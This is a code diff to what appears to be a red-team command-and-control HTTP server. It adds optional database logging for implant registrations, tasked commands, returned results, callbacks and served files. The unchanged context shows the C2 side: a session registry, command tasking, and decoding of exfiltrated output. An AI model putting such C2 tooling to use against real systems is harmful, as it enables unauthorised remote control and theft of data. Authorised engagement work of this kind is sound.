@@ -74,6 +74,13 @@ _MIME = {
 
 _EXFIL_LOG: list[tuple[str, str, str]] = []
 
+# ── Engagement DB (optional — set by cmd_serve) ──────────────────────────────
+_ENGAGE_DB = None   # type: core.engage.EngagementDB | None
+
+def set_engage_db(db) -> None:
+    global _ENGAGE_DB
+    _ENGAGE_DB = db
+
 # ── C2 session registry ──────────────────────────────────────────────────────
 _C2_SESSIONS: dict = {}
 _C2_LOCK = threading.Lock()
@@ -211,6 +218,10 @@ class _Handler(http.server.BaseHTTPRequestHandler):
 
         ts = datetime.now().strftime("%H:%M:%S")
         print(f"[{ts}] GET  {raw_path} → {self.client_address[0]}  ({len(data):,}B)")
+        if _ENGAGE_DB:
+            _ENGAGE_DB.log_event("file_served",
+                                 f"{basename} → {self.client_address[0]}",
+                                 extra={"path": raw_path, "size": len(data), "client": self.client_address[0]})
 
     def do_POST(self):
         raw_path = self.path.rstrip("/")
@@ -277,6 +288,9 @@ class _Handler(http.server.BaseHTTPRequestHandler):
 
         ts = datetime.now().strftime("%H:%M:%S")
         print(f"\n[{ts}] C2 REGISTER  session={session_id}  src={self.client_address[0]}  key=0x{key:02X}\n")
+        if _ENGAGE_DB:
+            _ENGAGE_DB.log_session(session_id, self.client_address[0])
+            _ENGAGE_DB.log_event("register", f"src={self.client_address[0]}", session_id=session_id)
 
     def _handle_c2_poll(self, session_id: str):
         time.sleep(random.uniform(0.05, 0.15))
@@ -307,6 +321,9 @@ class _Handler(http.server.BaseHTTPRequestHandler):
 
         ts = datetime.now().strftime("%H:%M:%S")
         print(f"[{ts}] C2 TASK  session={session_id}  task={task_id}  cmd={command!r}")
+        if _ENGAGE_DB:
+            _ENGAGE_DB.log_task(task_id, session_id, command)
+            _ENGAGE_DB.touch_session(session_id)
 
     def _handle_c2_result(self, session_id: str, task_id: str, body: bytes):
         output = _decode_exfil(body)
@@ -327,6 +344,10 @@ class _Handler(http.server.BaseHTTPRequestHandler):
         print(f"{'─'*60}")
         print(output.rstrip() if output.strip() else "[no output]")
         print(f"{'─'*60}\n")
+        if _ENGAGE_DB:
+            is_bin = output.startswith("_BIN_B64:\n")
+            _ENGAGE_DB.log_result(task_id, session_id, output, is_binary=is_bin)
+            _ENGAGE_DB.touch_session(session_id)
 
     def _handle_callback(self, token: str, body: bytes):
         output = _decode_exfil(body)
@@ -346,6 +367,10 @@ class _Handler(http.server.BaseHTTPRequestHandler):
         print(f"{'─'*60}")
         print(output.rstrip())
         print(f"{'─'*60}\n")
+        if _ENGAGE_DB:
+            _ENGAGE_DB.log_event("callback",
+                                 f"token={token} src={self.client_address[0]}",
+                                 extra={"output_preview": output[:500]})
 
     # ── helpers ───────────────────────────────────────────────────────────────
 
